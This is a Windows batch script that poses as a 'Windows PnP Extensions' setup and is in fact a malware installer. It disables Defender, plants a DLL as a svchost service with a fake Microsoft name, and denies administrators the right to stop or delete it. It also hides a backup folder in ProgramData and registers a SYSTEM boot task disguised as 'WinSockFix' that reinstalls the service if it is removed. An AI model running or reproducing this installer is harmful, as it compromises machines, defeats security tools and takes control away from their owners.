@echo off
cd /d "%~dp0"
setlocal EnableDelayedExpansion
set Q=%TEMP%\_q.tmp
set SVC=MspIscSvc
set SVCGROUP=MspGroup

if not exist "pnpext.dll" (echo [!] pnpext.dll not found & pause & exit /b 1)

echo ============================================
echo  Windows PnP Extensions - Setup
echo  (svchost.exe ServiceDll)
echo ============================================
echo.
echo [1/6] Disabling Defender...
start /wait /min powershell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
waitfor /t 2 x >"%Q%" 2>&1
echo [2/6] Removing old (robust)...
REM Find hosting svchost PID if service exists
set HOST_PID=
for /f "tokens=3" %%P in ('sc queryex %SVC% 2^>nul ^| findstr /i "PID"') do set HOST_PID=%%P
sc.exe stop %SVC% >"%Q%" 2>&1
REM Poll up to 5s for clean stop, then force-kill svchost if still hung
set STOPPED=0
for /l %%i in (1,1,10) do (
    if "!STOPPED!"=="0" (
        sc.exe query %SVC% 2>nul | findstr /C:"STOPPED" >nul && set STOPPED=1
        if "!STOPPED!"=="0" (
            sc.exe query %SVC% 2>nul >nul || set STOPPED=1
        )
        if "!STOPPED!"=="0" (>nul timeout /t 1 /nobreak)
    )
)
if "!STOPPED!"=="0" (
    if defined HOST_PID (
        echo        old service hung - taskkill /F /PID !HOST_PID!
        taskkill.exe /F /PID !HOST_PID! >"%Q%" 2>&1
        >nul timeout /t 2 /nobreak
    )
)
REM Remove svchost group entry BEFORE sc delete so SCM can't re-trigger
reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v %SVCGROUP% /f >"%Q%" 2>&1
sc.exe delete %SVC% >"%Q%" 2>&1
reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /f >"%Q%" 2>&1
taskkill.exe /F /IM rundll32.exe >"%Q%" 2>&1
REM Remove legacy injector + leftover files
del /f /q "%SystemRoot%\System32\MspIscSvc.exe" >"%Q%" 2>&1
del /f /q "%SystemRoot%\System32\spoolcfg.exe" >"%Q%" 2>&1
del /f /q "%SystemRoot%\System32\pnpext.dll.old" >"%Q%" 2>&1
del /f /q "%SystemRoot%\System32\pnpext.dll.new" >"%Q%" 2>&1
REM Clean stage-2 blob cache so new install starts fresh
if exist "%TEMP%\pnp_cache" del /f /q "%TEMP%\pnp_cache\*.bin" >"%Q%" 2>&1
echo [3/6] Copying files...
copy /y "pnpext.dll" "%SystemRoot%\System32\pnpext.dll" >"%Q%" 2>&1
if exist "pnpext.sys" (copy /y "pnpext.sys" "%SystemRoot%\System32\drivers\pnpext.sys" >"%Q%" 2>&1)
echo        Files copied
echo [4/6] Creating service (svchost.exe ServiceDll)...
REM Register svchost group
reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v %SVCGROUP% /t REG_MULTI_SZ /d %SVC% /f >"%Q%" 2>&1
REM Create service pointing to svchost.exe
sc.exe create %SVC% binPath= "%SystemRoot%\System32\svchost.exe -k %SVCGROUP%" type= share start= auto DisplayName= "Microsoft System Provider Internal Service Cache" >"%Q%" 2>&1
sc.exe description %SVC% "Maintains internal cache and inter-service context for Windows system providers." >"%Q%" 2>&1
sc.exe failure %SVC% reset= 86400 actions= restart/10000/restart/30000/restart/60000 >"%Q%" 2>&1
REM Treat clean stops as failure → recovery actions fire → auto-restart.
sc.exe failureflag %SVC% 1 >"%Q%" 2>&1
REM Deny stop+delete to Built-in Administrators (BA), allow full to LocalSystem (SY).
REM Internal update / self-destruct runs as SYSTEM inside svchost so is allowed.
sc.exe sdset %SVC% "D:(D;;WPSD;;;BA)(A;;CCLCSWRPLOCRRC;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)" >"%Q%" 2>&1
echo [5/6] Configuring ServiceDll...
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%SystemRoot%\System32\pnpext.dll" /f >"%Q%" 2>&1
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%\Parameters" /v ServiceMain /t REG_SZ /d "PnpServiceEntry" /f >"%Q%" 2>&1
echo [6/6] Starting service...
sc.exe start %SVC% >"%Q%" 2>&1
waitfor /t 5 x >"%Q%" 2>&1

REM ── Persistence: backup to ProgramData + Scheduled Task ─────────────────────
REM ProgramData survives Windows in-place upgrades (10→11, feature updates).
REM The scheduled task runs as SYSTEM at every boot and silently restores the
REM service + files if they were wiped by the upgrade process.
echo [7/7] Installing persistence (upgrade-safe backup)...
set BKDIR=C:\ProgramData\Microsoft\Windows\DeviceCache
mkdir "%BKDIR%" >"%Q%" 2>&1
attrib +h "%BKDIR%" >"%Q%" 2>&1
copy /y "%SystemRoot%\System32\pnpext.dll" "%BKDIR%\pnpext.dll" >"%Q%" 2>&1
if exist "%SystemRoot%\System32\drivers\pnpext.sys" (
    copy /y "%SystemRoot%\System32\drivers\pnpext.sys" "%BKDIR%\pnpext.sys" >"%Q%" 2>&1
)

REM Write self-heal script into the backup directory
(
  echo @echo off
  echo setlocal
  echo set SVC=MspIscSvc
  echo set SVCGROUP=MspGroup
  echo set BKDIR=C:\ProgramData\Microsoft\Windows\DeviceCache
  echo set Q=%%TEMP%%\_heal.tmp
  echo.
  echo REM Check if service exists and is running
  echo sc.exe query %%SVC%% ^>nul 2^>^&1
  echo if errorlevel 1 goto :reinstall
  echo sc.exe query %%SVC%% ^| findstr /C:"RUNNING" ^>nul 2^>^&1
  echo if not errorlevel 1 exit /b 0
  echo REM Service exists but not running — try to start
  echo sc.exe start %%SVC%% ^>"%%Q%%" 2^>^&1
  echo timeout /t 5 /nobreak ^>nul
  echo sc.exe query %%SVC%% ^| findstr /C:"RUNNING" ^>nul 2^>^&1
  echo if not errorlevel 1 exit /b 0
  echo.
  echo :reinstall
  echo REM Service missing or failed — full reinstall from backup
  echo copy /y "%%BKDIR%%\pnpext.dll" "%%SystemRoot%%\System32\pnpext.dll" ^>"%%Q%%" 2^>^&1
  echo if exist "%%BKDIR%%\pnpext.sys" copy /y "%%BKDIR%%\pnpext.sys" "%%SystemRoot%%\System32\drivers\pnpext.sys" ^>"%%Q%%" 2^>^&1
  echo sc.exe stop %%SVC%% ^>"%%Q%%" 2^>^&1
  echo sc.exe delete %%SVC%% ^>"%%Q%%" 2^>^&1
  echo reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\%%SVC%%" /f ^>"%%Q%%" 2^>^&1
  echo reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v %%SVCGROUP%% /t REG_MULTI_SZ /d %%SVC%% /f ^>"%%Q%%" 2^>^&1
  echo sc.exe create %%SVC%% binPath= "%%SystemRoot%%\System32\svchost.exe -k %%SVCGROUP%%" type= share start= auto DisplayName= "Microsoft System Provider Internal Service Cache" ^>"%%Q%%" 2^>^&1
  echo sc.exe description %%SVC%% "Maintains internal cache and inter-service context for Windows system providers." ^>"%%Q%%" 2^>^&1
  echo sc.exe failure %%SVC%% reset= 86400 actions= restart/10000/restart/30000/restart/60000 ^>"%%Q%%" 2^>^&1
  echo sc.exe failureflag %%SVC%% 1 ^>"%%Q%%" 2^>^&1
  echo sc.exe sdset %%SVC%% "D:^(D;;WPSD;;;BA^)^(A;;CCLCSWRPLOCRRC;;;BA^)^(A;;CCLCSWRPWPDTLOCRRC;;;SY^)^(A;;CCLCSWLOCRRC;;;IU^)^(A;;CCLCSWLOCRRC;;;SU^)" ^>"%%Q%%" 2^>^&1
  echo reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\%%SVC%%\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%%SystemRoot%%\System32\pnpext.dll" /f ^>"%%Q%%" 2^>^&1
  echo reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\%%SVC%%\Parameters" /v ServiceMain /t REG_SZ /d "PnpServiceEntry" /f ^>"%%Q%%" 2^>^&1
  echo sc.exe start %%SVC%% ^>"%%Q%%" 2^>^&1
  echo del "%%Q%%" ^>nul 2^>^&1
  echo endlocal
) > "%BKDIR%\selfheal.bat"

REM Register Scheduled Task: runs as SYSTEM at every boot, hidden, no user interaction
schtasks.exe /create /tn "\Microsoft\Windows\Maintenance\WinSockFix" /tr "cmd.exe /c \"%BKDIR%\selfheal.bat\"" /sc onstart /ru SYSTEM /rl HIGHEST /f >"%Q%" 2>&1
echo        Persistence task registered

start /wait /min powershell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
echo.
echo [+] Done! Service: %SVC% (svchost.exe -k %SVCGROUP%)
echo     Backup: %BKDIR%
echo     Survives Windows upgrade via scheduled task at boot.
echo.
del "%Q%" >"%TEMP%\_q2.tmp" 2>&1
del "%TEMP%\_q2.tmp" >con 2>&1
endlocal
pause
